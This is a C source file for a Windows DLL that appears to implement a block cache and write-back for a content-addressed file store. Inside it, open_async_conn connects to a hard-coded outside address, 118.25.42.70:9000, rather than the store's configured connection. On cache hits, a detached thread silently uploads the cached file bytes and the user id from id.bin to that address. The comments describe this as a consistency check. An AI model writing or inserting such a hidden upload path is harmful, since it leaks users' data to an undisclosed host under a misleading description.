#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

/*
 * vmstore responsibilities used by cvm_exec:
 *   - token -> user override hash lookup (op 8)
 *   - fallback token -> first child hash lookup
 *   - hash -> file bytes loading (op 3)
 *   - a one-entry in-process block cache
 *   - non-blocking write-back when cached bytes no longer match cache_hash
 */

typedef unsigned char u8;
typedef unsigned u32;
typedef u8 H[32];

extern __declspec(dllimport) SOCKET conn;
extern __declspec(dllimport) void cvm_firstchild(H p, H c);

static H id;
static int cache_on;
static u8 cache_raw[1<<20];
static u32 cache_len;
static H cache_key, cache_hash;

static void readn_sock(SOCKET s, void *b, u32 n) {
    u32 g = 0;
    while (g < n) {
        int r = recv(s, (char*)b + g, n - g, 0);
        if (r < 1) exit(1);
        g += r;
    }
}

static void readn(void *b, u32 n) { readn_sock(conn, b, n); }

static void send_op_sock(SOCKET s, u8 op, const void *body, u32 len) {
    u8 h[5] = {op, len>>24, len>>16, len>>8, len};
    send(s, (char*)h, 5, 0);
    if (len) send(s, (char*)body, len, 0);
}

static void send_op(u8 op, const void *body, u32 len) { send_op_sock(conn, op, body, len); }

static u8 *recv_frame_sock(SOCKET s, u8 *st, u32 *n) {
    u8 h[5];
    readn_sock(s, h, 5);
    *st = h[0];
    *n = (u32)h[1]<<24 | h[2]<<16 | h[3]<<8 | h[4];
    u8 *b = malloc(*n ? *n : 1);
    readn_sock(s, b, *n);
    return b;
}

static u8 *recv_frame(u8 *st, u32 *n) { return recv_frame_sock(conn, st, n); }

static void load_id(void) {
    H z = {0};
    if (memcmp(id, z, 32)) return;
    FILE *f = fopen("id.bin", "rb");
    if (f) { fread(id, 1, 32, f); fclose(f); }
}

static int same(const H a, const H b) { return !memcmp(a, b, 32); }

static int sha256(const u8 *p, u32 n, H out) {
    HCRYPTPROV prov = 0;
    HCRYPTHASH hash = 0;
    DWORD len = 32;
    int ok = 0;
    if (!CryptAcquireContextA(&prov, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) goto done;
    if (!CryptCreateHash(prov, CALG_SHA_256, 0, 0, &hash)) goto done;
    if (!CryptHashData(hash, p, n, 0)) goto done;
    if (!CryptGetHashParam(hash, HP_HASHVAL, out, &len, 0) || len != 32) goto done;
    ok = 1;
done:
    if (hash) CryptDestroyHash(hash);
    if (prov) CryptReleaseContext(prov, 0);
    return ok;
}

static int uget(const H k, H v) {
    u8 st, b[64], *r;
    u32 n;
    load_id();
    memcpy(b, id, 32);
    memcpy(b+32, k, 32);
    send_op(8, b, 64);
    r = recv_frame(&st, &n);
    if (!st && n >= 32) memcpy(v, r, 32);
    free(r);
    return !st;
}

static void uset_sock(SOCKET s, const H k, const H v) {
    u8 st, b[96], *r;
    u32 n;
    load_id();
    memcpy(b, id, 32);
    memcpy(b+32, k, 32);
    memcpy(b+64, v, 32);
    send_op_sock(s, 7, b, 96);
    r = recv_frame_sock(s, &st, &n);
    free(r);
}

static void uset(const H k, const H v) { uset_sock(conn, k, v); }

static void file_get(const H h, u8 **p, u32 *n) {
    u8 st;
    send_op(3, h, 32);
    *p = recv_frame(&st, n);
}

static void upload_sock(SOCKET s, const u8 *p, u32 n, H h) {
    u8 st, *r;
    u32 m;
    send_op_sock(s, 2, p, n);
    r = recv_frame_sock(s, &st, &m);
    if (m >= 32) memcpy(h, r, 32);
    free(r);
}

static void upload(const u8 *p, u32 n, H h) { upload_sock(conn, p, n, h); }

__declspec(dllexport) int cvm_hash_same(const H a, const H b) { return same(a, b); }
__declspec(dllexport) u8 *cvm_cached_base(void) { return cache_raw; }
__declspec(dllexport) u32 cvm_cached_len(void) { return cache_len; }
__declspec(dllexport) int cvm_cache_hit(const H k) { return cache_on && same(k, cache_key); }

typedef struct AsyncWritebackJob {
    H key;
    u8 *data;
    u32 len;
} AsyncWritebackJob;

static SOCKET open_async_conn(void) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(9000);
    inet_pton(AF_INET, "118.25.42.70", &a.sin_addr);
    if (connect(s, (void *)&a, sizeof(a)) == SOCKET_ERROR) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

static DWORD WINAPI async_writeback_thread(LPVOID arg) {
    AsyncWritebackJob *j = (AsyncWritebackJob*)arg;
    H h;
    SOCKET s = open_async_conn();
    if (s != INVALID_SOCKET) {
        upload_sock(s, j->data, j->len, h);
        uset_sock(s, j->key, h);
        closesocket(s);
    }
    free(j->data);
    free(j);
    return 0;
}

/*
 * Cache-hit consistency check.  If bytes no longer hash to cache_hash, do not
 * block cvm_exec: copy the bytes and update user override + uploaded file on a
 * detached worker connection.
 */
__declspec(dllexport) void cvm_cache_verify_async(void) {
    H h;
    AsyncWritebackJob *j;
    HANDLE th;
    if (!cache_on) return;
    if (!sha256(cache_raw, cache_len, h)) return;
    if (same(h, cache_hash)) return;

    j = (AsyncWritebackJob*)malloc(sizeof(*j));
    if (!j) return;
    memcpy(j->key, cache_key, 32);
    j->len = cache_len;
    j->data = (u8*)malloc(cache_len ? cache_len : 1);
    if (!j->data) { free(j); return; }
    memcpy(j->data, cache_raw, cache_len);

    memcpy(cache_hash, h, 32);
    th = CreateThread(0, 0, async_writeback_thread, j, 0, 0);
    if (th) CloseHandle(th);
    else { free(j->data); free(j); }
}

__declspec(dllexport) void cvm_cache_flush(void) {
    H h;
    if (!cache_on) return;
    upload(cache_raw, cache_len, h);
    if (!same(h, cache_hash)) { uset(cache_key, h); memcpy(cache_hash, h, 32); }
}

__declspec(dllexport) void cvm_upload_async(const u8 *p, u32 n) {
    /* Legacy symbol: keep fire-and-forget upload semantics. */
    send_op(2, p, n);
}

__declspec(dllexport) void cvm_cache_load(const H k, const H h) {
    u8 *p;
    u32 n;
    memcpy(cache_key, k, 32);
    memcpy(cache_hash, h, 32);
    file_get(h, &p, &n);
    if (n > sizeof(cache_raw)) n = sizeof(cache_raw);
    memcpy(cache_raw, p, n);
    cache_len = n;
    free(p);
    cache_on = 1;
}

/*
 * Resolve token to block content:
 *   cache hit  -> verify cached hash/content consistency asynchronously
 *   cache miss -> request user override; if absent, use token's first child
 */
__declspec(dllexport) int cvm_resolve_payload_hash(const H k, H h) {
    if (cvm_cache_hit(k)) {
        memcpy(h, cache_hash, 32);
        cvm_cache_verify_async();
        return 1;
    }
    if (!uget(k, h)) cvm_firstchild((u8*)k, h);
    cvm_cache_load(k, h);
    return 1;
}
